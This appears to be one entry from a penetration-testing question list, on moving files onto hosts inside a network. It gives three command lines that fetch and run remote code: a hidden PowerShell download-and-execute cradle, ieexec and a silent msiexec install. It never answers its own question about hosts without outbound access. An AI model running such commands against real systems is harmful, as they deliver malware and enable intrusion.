# 19. How to perform file deployment in an internal network, and which commands are used? What if the target host cannot initiate outbound connections?

Leverage the Windows caching mechanism for file deployment:
- `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/test.ps1'))"`
- `ieexec http://ip:8080/test.exe`
- `msiexec.exe /q /i http://192.168.173.45/test.msi`
Using VBScript to execute remote commands typically requires Windows management tools such as WMI.
